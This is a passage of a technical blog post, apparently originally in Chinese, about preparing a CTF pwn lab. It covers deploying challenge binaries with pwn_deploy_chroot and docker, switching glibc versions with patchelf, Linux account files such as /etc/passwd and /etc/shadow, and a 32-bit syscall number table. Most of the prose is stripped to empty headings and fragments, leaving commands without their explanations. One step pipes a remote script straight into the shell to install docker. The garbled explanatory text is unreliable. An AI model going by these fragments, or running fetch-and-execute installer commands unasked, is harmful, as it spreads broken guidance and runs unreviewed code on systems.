class=\"line\">  -n </span><br><span class=\"line\">  -s</span><br><span class=\"line\">  -v</span><br><span class=\"line\">  --color&#x3D;auto </span><br></pre></td></tr></table></figure>\n<h1 id=\"0x03pwn\"><a href=\"#0x03pwn\" class=\"headerlink\" title=\"0x03pwn\"></a>0x03pwn</h1><p><a href=\"https://github.com/giantbranch/pwn_deploy_chroot\" target=\"_blank\" rel=\"noopener\">https://github.com/giantbranch/pwn_deploy_chroot</a></p>\n<h2 id=\"pwn-deploy-chroot\"><a href=\"#pwn-deploy-chroot\" class=\"headerlink\" title=\"pwn_deploy_chroot\"></a>pwn_deploy_chroot</h2><h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><blockquote>\n<ol>\n<li>docker</li>\n<li>flag,</li>\n<li>xinted + docker + chroot</li>\n<li>pythonpwn3pwn.xinetdDockerfiledocker-compose.yml</li>\n<li>/bincatflag/bin/sh,system(/bin/sh)flag</li>\n<li>10000+1config.pypwn.xinetddocker-compose.yml</li>\n</ol>\n</blockquote>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># docker</span><br><span class=\"line\">curl -s https:&#x2F;&#x2F;get.docker.com&#x2F; | sh</span><br><span class=\"line\">#  docker compose git</span><br><span class=\"line\">apt install docker-compose git</span><br><span class=\"line\"># </span><br><span class=\"line\">git clone https:&#x2F;&#x2F;github.com&#x2F;giantbranch&#x2F;pwn_deploy_chroot.git</span><br></pre></td></tr></table></figure>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p>3</p>\n<blockquote>\n<ol>\n<li>pwnbinlinux</li>\n<li>python <a href=\"http://initialize.py/\" target=\"_blank\" rel=\"noopener\">initialize.py</a></li>\n<li>docker-compose up build -d</li>\n</ol>\n</blockquote>\n<p></p>\n<p>1pwnbin</p>\n<p>copy3</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@instance-1:~&#x2F;pwn_deploy_chroot# ls bin&#x2F;</span><br><span class=\"line\">pwn1  pwn1_copy1  pwn1_copy2</span><br><span class=\"line\">12</span><br></pre></td></tr></table></figure>\n<p>2<a href=\"http://xn--initialize-3f62aw61d.py/\" target=\"_blank\" rel=\"noopener\">initialize.py</a></p>\n<p>pwn</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@instance-1:~&#x2F;pwn_deploy_chroot# python initialize.py</span><br><span class=\"line\"></span><br><span class=\"line\">pwn1&#39;s port: 10000</span><br><span class=\"line\">pwn1_copy1&#39;s port: 10001</span><br><span class=\"line\">pwn1_copy2&#39;s port: 10002</span><br></pre></td></tr></table></figure>\n<p>flagflags.txt</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@instance-1:~&#x2F;pwn_deploy_chroot# cat flags.txt </span><br><span class=\"line\">pwn1: flag&#123;93aa6da5-db45-46fa-a2e1-af2be6698692&#125;</span><br><span class=\"line\">pwn1_copy1: flag&#123;f9966c51-52e4-4212-ac44-97bf16620b41&#125;</span><br><span class=\"line\">pwn1_copy2: flag&#123;b17949ce-e3fa-4ca7-9fcc-44b8dc997cb3&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">pwn1&#39;s port: 10000</span><br><span class=\"line\">pwn1_copy1&#39;s port: 10001</span><br><span class=\"line\">pwn1_copy2&#39;s port: 10002</span><br><span class=\"line\">12345678</span><br></pre></td></tr></table></figure>\n<p>3</p>\n<p>root</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker-compose up --build -d</span><br></pre></td></tr></table></figure>\n<p></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@instance-1:~&#x2F;pwn_deploy_chroot# netstat -antp | grep docker</span><br><span class=\"line\">tcp6       0      0 :::10002                :::*                    LISTEN      19828&#x2F;docker-proxy</span><br><span class=\"line\">tcp6       0      0 :::10000                :::*                    LISTEN      19887&#x2F;docker-proxy</span><br><span class=\"line\">tcp6       0      0 :::10001                :::*                    LISTEN      19873&#x2F;docker-proxy</span><br></pre></td></tr></table></figure>\n<h1 id=\"0x04-libc\"><a href=\"#0x04-libc\" class=\"headerlink\" title=\"0x04 libc\"></a>0x04 libc</h1><p>patchelf</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git clone https:&#x2F;&#x2F;codechina.csdn.net&#x2F;mirrors&#x2F;NixOS&#x2F;patchelf.git</span><br></pre></td></tr></table></figure>\n<p>glibc</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git clone https:&#x2F;&#x2F;github.com&#x2F;matrix1001&#x2F;glibc-all-in-one</span><br></pre></td></tr></table></figure>\n<p><strong>glibc</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.&#x2F;update_list</span><br><span class=\"line\">cat list</span><br><span class=\"line\">.&#x2F;download xxlibc &#x2F;&#x2F;libc</span><br></pre></td></tr></table></figure>\n<p><strong>patchelf</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install autoconf automake libtool</span><br><span class=\"line\">.&#x2F;bootstrap.sh</span><br><span class=\"line\">.&#x2F;configure</span><br><span class=\"line\">make</span><br><span class=\"line\">sudo make install</span><br><span class=\"line\">make check</span><br></pre></td></tr></table></figure>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd &#x2F;lib64</span><br><span class=\"line\">sudo su</span><br><span class=\"line\">sudo ln -s &#x2F;home&#x2F;pz1o&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.27-3ubuntu1.2_amd64&#x2F;ld-2.27.so .&#x2F;2.27-ld.so.2</span><br></pre></td></tr></table></figure>\n<h2 id=\"elfldlibc\"><a href=\"#elfldlibc\" class=\"headerlink\" title=\"elfldlibc\"></a>elfldlibc</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">patchelf --set-interpreter &#x2F;lib64&#x2F;2.27-ld.so.2 .&#x2F;tcache</span><br><span class=\"line\">patchelf --replace-needed libc.so.6 ~&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.27-3ubuntu1.2_amd64&#x2F;libc-2.27.so .&#x2F;tcache</span><br><span class=\"line\">patchelf --set-interpreter &#x2F;home&#x2F;pz1o&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.27-3ubuntu1.2_amd64&#x2F;ld-2.27.so  --set-rpath  ~&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.27-3ubuntu1.2_amd64 tcache</span><br></pre></td></tr></table></figure>\n<h1 id=\"0x06-\"><a href=\"#0x06-\" class=\"headerlink\" title=\"0x06 \"></a>0x06 </h1><h2 id=\"1-\"><a href=\"#1-\" class=\"headerlink\" title=\"1.\"></a>1.</h2><h3 id=\"1-1-\"><a href=\"#1-1-\" class=\"headerlink\" title=\"1.1 \"></a>1.1 </h3><p>0 root<br>1-499<br>500-60000</p>\n<p>Linux</p>\n<p></p>\n<p>/etc/passwd</p>\n<h3 id=\"1-2-etc-passwd\"><a href=\"#1-2-etc-passwd\" class=\"headerlink\" title=\"1.2 /etc/passwd\"></a>1.2 /etc/passwd</h3><p><strong>root</strong>root</p>\n<p></p>\n<p>Shell</p>\n<blockquote>\n<p><br>rootpasswd<br><br><br>mailfinger<br>root/root/home<br>ShellShell</p>\n</blockquote>\n<h3 id=\"1-3-etc-shadow\"><a href=\"#1-3-etc-shadow\" class=\"headerlink\" title=\"1.3 /etc/shadow\"></a>1.3 /etc/shadow</h3><p>root</p>\n<p></p>\n<p></p>\n<blockquote>\n<p><br>*<br>197011<br><br><br><br><br>197011<br></p>\n</blockquote>\n<h2 id=\"2-\"><a href=\"#2-\" class=\"headerlink\" title=\"2.\"></a>2.</h2><p>Linuxrootdaemonbinsys</p>\n<p></p>\n<h3 id=\"2-1-etc-group\"><a href=\"#2-1-etc-group\" class=\"headerlink\" title=\"2.1 /etc/group\"></a>2.1 /etc/group</h3><p></p>\n<p></p>\n<h2 id=\"3-\"><a href=\"#3-\" class=\"headerlink\" title=\"3. \"></a>3. </h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//add</span><br><span class=\"line\">useradd [option] </span><br><span class=\"line\">//systemgroup</span><br><span class=\"line\">adduser [option] user</span><br><span class=\"line\"></span><br><span class=\"line\">//del</span><br><span class=\"line\">userdel [option] </span><br><span class=\"line\">-f</span><br><span class=\"line\">-r</span><br><span class=\"line\"></span><br><span class=\"line\">//edit passwd</span><br><span class=\"line\">passwd [option] </span><br><span class=\"line\"></span><br><span class=\"line\">//show user information</span><br><span class=\"line\">id [option] []</span><br><span class=\"line\"></span><br><span class=\"line\">//change user</span><br><span class=\"line\">su [option] []</span><br></pre></td></tr></table></figure>\n<h2 id=\"4-\"><a href=\"#4-\" class=\"headerlink\" title=\"4.\"></a>4.</h2><p>usergroup</p>\n<h1 id=\"0x07-\"><a href=\"#0x07-\" class=\"headerlink\" title=\"0x07 \"></a>0x07 </h1><h2 id=\"1-ip\"><a href=\"#1-ip\" class=\"headerlink\" title=\"1.ip\"></a>1.ip</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl ifconfig.me</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-\"><a href=\"#2-\" class=\"headerlink\" title=\"2.\"></a>2.</h2><h3 id=\"32\"><a href=\"#32\" class=\"headerlink\" title=\"32\"></a>32</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat &#x2F;usr&#x2F;include&#x2F;asm&#x2F;unistd_32.h &gt; syscall.list</span><br></pre></td></tr></table></figure>\n<div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th></th>\n<th></th>\n<th></th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>exit</td>\n<td>1</td>\n<td>fork</td>\n<td>2</td>\n</tr>\n<tr>\n<td>read</td>\n<td>3</td>\n<td>write</td>\n<td>4</td>\n</tr>\n<tr>\n<td>open</td>\n<td>5</td>\n<td>close</td>\n<td>6</td>\n</tr>\n<tr>\n<td>waitpid</td>\n<td>7</td>\n<td>creat</td>\n<td>8</td>\n</tr>\n<tr>\n<td>link</td>\n<td>9</td>\n<td>unlink</td>\n<td>10</td>\n</tr>\n<tr>\n<td>execve</td>\n<td>11</td>\n<td>chdir</td>\n<td>12</td>\n</tr>\n<tr>\n<td>time</td>\n<td>13</td>\n<td>mknod</td>\n<td>14</td>\n</tr>\n<tr>\n<td>chmod</td>\n<td>15</td>\n<td>lchown</td>\n<td>16</td>\n</tr>\n<tr>\n<td>break</td>\n<td>17</td>\n<td>oldstat</td>\n<td>18</td>\n</tr>\n<tr>\n<td>lseek</td>\n<td>19</td>\n<td>getpid</td>\n<td>20</td>\n</tr>\n<tr>\n<td>mount</td>\n<td>21</td>\n<td>umount</td>\n<td>22</td>\n</tr>\n<tr>\n<td>setuid</td>\n<td>23</td>\n<td>getuid</td>\n<td>24</td>\n</tr>\n<tr>\n<td>stime</td>\n<td>25</td>\n<td>ptrace</td>\n<td>26</td>\n</tr>\n<tr>\n<td>alarm</td>\n<td>27</td>\n<td>oldfstat</td>\n<td>28</td>\n</tr>\n<tr>\n<td>pause</td>\n<td>29</td>\n<td>utime</td>\n<td>30</td>\n</tr>\n<tr>\n<td>stty</td>\n<td>31</td>\n<td>gtty</td>\n<td>32</td>\n</tr>\n<tr>\n<td>access</td>\n<td>33</td>\n<td>nice</td>\n<td>34</td>\n</tr>\n<tr>\n<td>ftime</td>\n<td>35</td>\n<td>sync</td>\n<td>36</td>\n</tr>\n<tr>\n<td>kill</td>\n<td>37</td>\n<td>rename</td>\n<td>38</td>\n</tr>\n<tr>\n<td>mkdir</td>\n<td>39</td>\n<td>rmdir</td>\n<td>40</td>\n</tr>\n<tr>\n<td>dup</td>\n<td>41</td>\n<td>pipe</td>\n<td>42</td>\n</tr>\n<tr>\n<td>times</td>\n<td>43</td>\n<td>prof</td>\n<td>44</td>\n</tr>\n<tr>\n<td>brk</td>\n<td>45</td>\n<td>setgid</td>\n<td>46</td>\n</tr>\n<tr>\n<td>getgid</td>\n<td>47</td>\n<td>signal</td>\n<td>48</td>\n</tr>\n<tr>\n<td>geteuid</td>\n<td>49</td>\n<td>getegid</td>\n<td>50</td>\n</tr>\n<tr>\n<td>acct</td>\n<td>51</td>\n<td>umount2</td>\n<td>52</td>\n</tr>\n<tr>\n<td>lock</td>\n<td>53</td>\n<td>ioctl</td>\n<td>54</td>\n</tr>\n<tr>\n<td>fcntl</td>\n<td>55</td>\n<td>mpx</td>\n<td>56</td>\n</tr>\n<tr>\n<td>setpgid</td>\n<td>57</td>\n<td>ulimit</td>\n<td>58</td>\n</tr>\n<tr>\n<td>oldolduname</td>\n<td>59</td>\n<td>umask</td>\n<td>60</td>\n</tr>\n<tr>\n<td>chroot</td>\n<td>61</td>\n<td>ustat</td>\n<td>62</td>\n</tr>\n<tr>\n<td>dup2</td>\n<td>63</td>\n<td>getppid</td>\n<td>64</td>\n</tr>\n<tr>\n<td>getpgrp</td>\n<td>65</td>\n<td>setsid</td>\n<td>66</td>\n</tr>\n<tr>\n<td>sigaction</td>\n<td>67</td>\n<td>sgetmask</td>\n<td>68</td>\n</tr>\n<tr>\n<td>ssetmask</td>\n<td>69</td>\n<td>setreuid</td>\n<td>70</td>\n</tr>\n<tr>\n<td>setregid</td>\n<td>71</td>\n<td>sigsuspend</td>\n<td>72</td>\n</tr>\n<tr>\n<td>sigpending</td>\n<td>73</td>\n<td>sethostname</td>\n<td>74</td>\n</tr>\n<tr>\n<td>setrlimit</td>\n<td>75</td>\n<td>getrlimit</td>\n<td>76</td>\n</tr>\n<tr>\n<td>getrusage</td>\n<td>77</td>\n<td>gettimeofday</td>\n<td>78</td>\n</tr>\n<tr>\n<td>settimeofday</td>\n<td>79</td>\n<td>getgroups</td>\n<td>80</td>\n</tr>\n<tr>\n<td>setgroups</td>\n<td>81</td>\n<td>select</td>\n<td>82</td>\n</tr>\n<tr>\n<td>symlink</td>\n<td>83</td>\n<td>oldlstat</td>\n<td>84</td>\n</tr>\n<tr>\n<td>readlink</td>\n<td>85</td>\n<td>uselib</td>\n<td>86</td>\n</tr>\n<tr>\n<td>swapon</td>\n<td>87</td>\n<td>reboot</td>\n<td>88</td>\n</tr>\n<tr>\n<td>readdir</td>\n<td>89</td>\n<td>mmap</td>\n<td>90</td>\n</tr>\n<tr>\n<td>munmap</td>\n<td>91</td>\n<td>truncate</td>\n<td>92</td>\n</tr>\n<tr>\n<td>ftruncate</td>\n<td>93</td>\n<td>fchmod</td>\n<td>94</td>\n</tr>\n<tr>\n<td>fchown</td>\n<td>95</td>\n<td>getpriority</td>\n<td>96</td>\n</tr>\n<tr>\n<td>setpriority</td>\n<td>97</td>\n<td>profil</td>\n<td>98</td>\n</tr>\n<tr>\n<td>statfs</td>\n<td>99</td>\n<td>fstatfs</td>\n<td>100</td>\n</tr>\n<tr>\n<td>ioperm</td>\n<td>101</td>\n<td>socketcall</td>\n<td>102</td>\n</tr>\n<tr>\n<td>syslog</td>\n<td>103</td>\n<td>setitimer</td>\n<td>104</td>\n</tr>\n<tr>\n<td>getitimer</td>\n<td>105</td>\n<td>stat</td>\n<td>106</td>\n</tr>\n<tr>\n<td>lstat</td>\n<td>107</td>\n<td>fstat</td>\n<td>108</td>\n</tr>\n<tr>\n<td>olduname</td>\n<td>109</td>\n<td>iopl</td>\n<td>110</td>\n</tr>\n<tr>\n<td>vhangup</td>\n<td>111</td>\n<td>idle</td>\n<td>112</td>\n</tr>\n<tr>\n<td>vm86old</td>\n<td>113</td>\n<td>wait4</td>\n<td>114</td>\n</tr>\n<tr>\n<td>swapoff</td>\n<td>115</td>\n<td>sysinfo</td>\n<td>116</td>\n</tr>\n<tr>\n<td>ipc</td>\n<td>117</td>\n<td>fsync</td>\n<td>118</td>\n</tr>\n<tr>\n<td>sigreturn</td>\n<td>119</td>\n<td>clone</td>\n<td>120</td>\n</tr>\n<tr>\n<td>setdomainname</td>\n<td>121</td>\n<td>uname</td>\n<td>122</td>\n</tr>\n<tr>\n<td>modify_ldt</td>\n<td>123</td>\n<td>adjtimex</td>\n<td>124</td>\n</tr>\n<tr>\n<td>mprotect</td>\n<td>125</td>\n<td>sigprocmask</td>\n<td>126</td>\n</tr>\n<tr>\n<td>create_module</td>\n<td>127</td>\n<td>init_module</td>\n<td>128</td>\n</tr>\n<tr>\n<td>delete_module</td>\n<td>129</td>\n<td>get_kernel_syms</td>\n<td>130</td>\n</tr>\n<tr>\n<td>quotactl</td>\n<td>131</td>\n<td>getpgid</td>\n<td>132</td>\n</tr>\n<tr>\n<td>fchdir</td>\n<td>133</td>\n<td>bdflush</td>\n<td>134</td>\n</tr>\n<tr>\n<td>sysfs</td>\n<td>135</td>\n<td>personality</td>\n<td>136</td>\n</tr>\n<tr>\n<td>afs_syscall</td>\n<td>137</td>\n<td>setfsuid</td>\n<td>138</td>\n</tr>\n<tr>\n<td>setfsgid</td>\n<td>139</td>\n<td>_llseek</td>\n<td>140</td>\n</tr>\n<tr>\n<td>getdents</td>\n<td>141</td>\n<td>_newselect</td>\n<td>142</td>\n</tr>\n<tr>\n<td>flock</td>\n<td>143</td>\n<td>msync</td>\n<td>144</td>\n</tr>\n<tr>\n<td>readv</td>\n<td>145</td>\n<td>writev</td>\n<td>146</td>\n</tr>\n<tr>\n<td>getsid</td>\n<td>147</td>\n<td>fdatasync</td>\n<td>148</td>\n</tr>\n<tr>\n<td>_sysctl</td>\n<td>149</td>\n<td>mlock</td>\n<td>150</td>\n</tr>\n<tr>\n<td>munlock</td>\n<td>151</td>\n<td>mlockall</td>\n<td>152</td>\n</tr>\n<tr>\n<td>munlockall</td>\n<td>153</td>\n<td>sched_setparam</td>\n<td>154</td>\n</tr>\n<tr>\n<td>sched_getparam</td>\n<td>155</td>\n<td>sched_setscheduler</td>\n<td>156</td>\n</tr>\n<tr>\n<td>sched_getscheduler</td>\n<td>157</td>\n<td>sched_yield</td>\n<td>158</td>\n</tr>\n<tr>\n<td>sched_get_priority_max</td>\n<td>159</td>\n<td>sched_get_priority_min</td>\n<td>160</td>\n</tr>\n<tr>\n<td>sched_rr_get_interval</td>\n<td>161</td>\n<td>nanosleep</td>\n<td>162</td>\n</tr>\n<tr>\n<td>mremap</td>\n<td>163</td>\n<td>setresuid</td>\n<td>164</td>\n</tr>\n<tr>\n<td>getresuid</td>\n<td>165</td>\n<td>vm86</td>\n<td>166</td>\n</tr>\n<tr>\n<td>query_module</td>\n<td>167</td>\n<td>poll</td>\n<td>168</td>\n</tr>\n<tr>\n<td>nfsservctl</td>\n<td>169</td>\n<td>setresgid</td>\n<td>170</td>\n</tr>\n<tr>\n<td>getresgid</td>\n<td>171</td>\n<td>prctl</td>\n<td>172</td>\n</tr>\n<tr>\n<td>rt_sigreturn</td>\n<td>173</td>\n<td>rt_sigaction</td>\n<td>174</td>\n</tr>\n<tr>\n<td>rt_sigprocmask</td>\n<td>175</td>\n<td>rt_sigpending</td>\n<td>176</td>\n</tr>\n<tr>\n<td>rt_sigtimedwait</td>\n<td>177</td>\n<td>rt_sigqueueinfo</td>\n<td>178</td>\n</tr>\n<tr>\n<td>rt_sigsuspend</td>\n<td>179</td>\n<td>pread64</td>\n<td>180</td>\n</tr>\n<tr>\n<td>pwrite64</td>\n<td>181</td>\n<td>chown</td>\n<td>182</td>\n</tr>\n<tr>\n<td>getcwd</td>\n<td>183</td>\n<td>capget</td>\n<td>184</td>\n</tr>\n<tr>\n<td>capset</td>\n<td>185</td>\n<td>sigaltstack</td>\n<td>186</td>\n</tr>\n<tr>\n<td>sendfile</td>\n<td>187</td>\n<td>getpmsg</td>\n<td>188</td>\n</tr>\n<tr>\n<td>putpmsg</td>\n<td>189</td>\n<td>vfork</td>\n<td>190</td>\n</tr>\n<tr>\n<td>ugetrlimit</td>\n<td>191</td>\n<td>mmap2</td>\n<td>192</td>\n</tr>\n<tr>\n<td>truncate64</td>\n<td>193</td>\n<td>ftruncate64</td>\n<td>194</td>\n</tr>\n<tr>\n<td>stat64</td>\n<td>195</td>\n<td>lstat64</td>\n<td>196</td>\n</tr>\n<tr>\n<td>fstat64</td>\n<td>197</td>\n<td>lchown32</td>\n<td>198</td>\n</tr>\n<tr>\n<td>getuid32</td>\n<td>199</td>\n<td>getgid32</td>\n<td>200</td>\n</tr>\n<tr>\n<td>geteuid32</td>\n<td>201</td>\n<td>getegid32</td>\n<td>202</td>\n</tr>\n<tr>\n<td>setreuid32</td>\n<td>203</td>\n<td>setregid32</td>\n<td>204</td>\n</tr>\n<tr>\n<td>getgroups32</td>\n<td>205</td>\n<td>setgroups32</td>\n<td>206</td>\n</tr>\n<tr>\n<td>fchown32</td>\n<td>207</td>\n<td>setresuid32</td>\n<td>208</td>\n</tr>\n<tr>\n<td>getresuid32</td>\n<td>209</td>\n<td>setresgid32</td>\n<td>210</td>\n</tr>\n<tr>\n<td>getresgid32</td>\n<td>211</td>\n<td>chown32</td>\n<td>212</td>\n</tr>\n<tr>\n<td>setuid32</td>\n<td>213</td>\n<td>setgid32</td>\n<td>214</td>\n</tr>\n<tr>\n<td>setfsuid32</td>\n<td>215</td>\n<td>setfsgid32</td>\n<td>216</td>\n</tr>\n<tr>\n<td>pivot_root</td>\n<td>217</td>\n<td>mincore</td>\n<td>218</td>\n</tr>\n<tr>\n<td>madvise</td>\n<td>219</td>\n<td>madvise1</td>\n<td>219</td>\n</tr>\n<tr>\n<td>getdents64</td>\n<td>220</td>\n<td>delete when C</td>\n<td>lib stub is removed</td>\n</tr>\n<tr>\n<td>fcntl64</td>\n<td>221</td>\n<td>gettid</td>\n<td>224</td>\n</tr>\n<tr>\n<td>readahead</td>\n<td>225</td>\n<td>setxattr</td>\n<td>226</td>\n</tr>\n<tr>\n<td>lsetxattr</td>\n<td>227</td>\n<td>fsetxattr</td>\n<td>228</td>\n</tr>\n<tr>\n<td>getxattr</td>\n<td>229</td>\n<td>lgetxattr</td>\n<td>230</td>\n</tr>\n<tr>\n<td>fgetxattr</td>\n<td>231</td>\n<td>listxattr</td>\n<td>232</td>\n</tr>\n<tr>\n<td>llistxattr</td>\n<td>233</td>\n<td>flistxattr</td>\n<td>234</td>\n</tr>\n<tr>\n<td>removexattr</td>\n<td>235</td>\n<td>lremovexattr</td>\n<td>236</td>\n</tr>\n<tr>\n<td>fremovexattr</td>\n<td>237</td>\n<td>tkill</td>\n<td>238</td>\n</tr>\n<tr>\n<td>sendfile64</td>\n<td>239</td>\n<td>futex</td>\n<td>240</td>\n</tr>\n<tr>\n<td>sched_setaffinity</td>\n<td>241</td>\n<td>sched_getaffinity</td>\n<td>242</td>\n</tr>\n<tr>\n<td>set_thread_area</td>\n<td>243</td>\n<td>get_thread_area</td>\n<td>244</td>\n</tr>\n<tr>\n<td>io_setup</td>\n<td>245</td>\n<td>io_destroy</td>\n<td>246</td>\n</tr>\n<tr>\n<td>io_getevents</td>\n<td>247</td>\n<td>io_submit</td>\n<td>248</td>\n</tr>\n<tr>\n<td>io_cancel</td>\n<td>249</td>\n<td>fadvise64</td>\n<td>250</td>\n</tr>\n<tr>\n<td></td>\n<td></td>\n<td>exit_group</td>\n<td>252</td>\n</tr>\n<tr>\n<td>lookup_dcookie</td>\n<td>253</td>\n<td>epoll_create</td>\n<td>254</td>\n</tr>\n<tr>\n<td>epoll_ctl</td>\n<td>255</td>\n<td>epoll_wait</td>\n<td>256</td>\n</tr>\n<tr>\n<td>remap_file_pages</td>\n<td>257</td>\n<td>set_tid_address</td>\n<td>258</td>\n</tr>\n<tr>\n<td>timer_create</td>\n<td>259</td>\n<td>timer_settime</td>\n<td>260</td>\n</tr>\n<tr>\n<td>timer_gettime</td>\n<td>261</td>\n<td>timer_getoverrun</td>\n<td>262</td>\n</tr>\n<tr>\n<td>timer_delete</td>\n<td>263</td>\n<td>clock_settime</td>\n<td>264</td>\n</tr>\n<tr>\n<td>clock_gettime</td>\n<td>265</td>\n<td>clock_getres</td>\n<td>266</td>\n</tr>\n<tr>\n<td>clock_nanosleep</td>\n<td>267</td>\n<td>statfs64</td>\n<td>268</td>\n</tr>\n<tr>\n<td>fstatfs64</td>\n<td>269</td>\n<td>tgkill</td>\n<td>270</td>\n</tr>\n<tr>\n<td>utimes</td>\n<td>271</td>\n<td>fadvise64_64</td>\n<td>272</td>\n</tr>\n<tr>\n<td>vserver</td>\n<td>273</td>\n<td>mbind</td>\n<td>274</td>\n</tr>\n<tr>\n<td>get_mempolicy</td>\n<td>275</td>\n<td>set_mempolicy</td>\n<td>276</td>\n</tr>\n<tr>\n<td>mq_open</td>\n<td>277</td>\n<td>mq_unlink</td>\n<td>278</td>\n</tr>\n<tr>\n<td>mq_timedsend</td>\n<td>279</td>\n<td>mq_timedreceive</td>\n<td>280</td>\n</tr>\n<tr>\n<td>mq_notify</td>\n<td>281</td>\n<td>mq_getsetattr</td>\n<td>282</td>\n</tr>\n<tr>\n<td>kexec_load</td>\n<td>283</td>\n<td>waitid</td>\n<td>284</td>\n</tr>\n<tr>\n<td>sys_setaltroot</td>\n<td>285</td>\n<td>add_key</td>\n<td>286</td>\n</tr>\n<tr>\n<td>request_key</td>\n<td>287</td>\n<td>keyctl</td>\n<td>288</td>\n</tr>\n<tr>\n<td>ioprio_set</td>\n<td>289</td>\n<td>ioprio_get</td>\n<td>290</td>\n</tr>\n<tr>\n<td>inotify_init</td>\n<td>291</td>\n<td>inotify_add_watch</td>\n<td>292</td>\n</tr>\n<tr>\n<td>inotify_rm_watch</td>\n<td>293</td>\n<td>migrate_pages</td>\n<td>294</td>\n</tr>\n<tr>\n<td>openat</td>\n<td>295</td>\n<td>mkdirat</td>\n<td>296</td>\n</tr>\n<tr>\n<td>mknodat</td>\n<td>297</td>\n<td>fchownat</td>\n<td>298</td>\n</tr>\n<tr>\n<td>futimesat</td>\n<td>299</td>\n<td>fstatat64</td>\n<td>300</td>\n</tr>\n<tr>\n<td>unlinkat</td>\n<td>301</td>\n<td>renameat</td>\n<td>302</td>\n</tr>\n<tr>\n<td>linkat</td>\n<td>303</td>\n<td>symlinkat</td>\n<td>304</td>\n</tr>\n<tr>\n<td>readlinkat</td>\n<td>305</td>\n<td>fchmodat</td>\n<td>306</td>\n</tr>\n<tr>\n<td>faccessat</td>\n<td>307</td>\n<td>pselect6</td>\n<td>308</td>\n</tr>\n<tr>\n<td>ppoll</td>\n<td>309</td>\n<td>unshare</td>\n<td>310</td>\n</tr>\n<tr>\n<td>set_robust_list</td>\n<td>311</td>\n<td>get_robust_list</td>\n<td>312</td>\n</tr>\n<tr>\n<td>splice</td>\n<td>313</td>\n<td>sync_file_range</td>\n<td>314</td>\n</tr>\n<tr>\n<td>tee</td>\n<td>315</td>\n<td>vmsplice</td>\n<td>316</td>\n</tr>\n<tr>\n<td>move_pages</td>\n<td>317</td>\n<td>getcpu</td>\n<td>318</td>\n</tr>\n<tr>\n<td>epoll_pwait</td>\n<td>319</td>\n<td>utimensat</td>\n<td>320</td>\n</tr>\n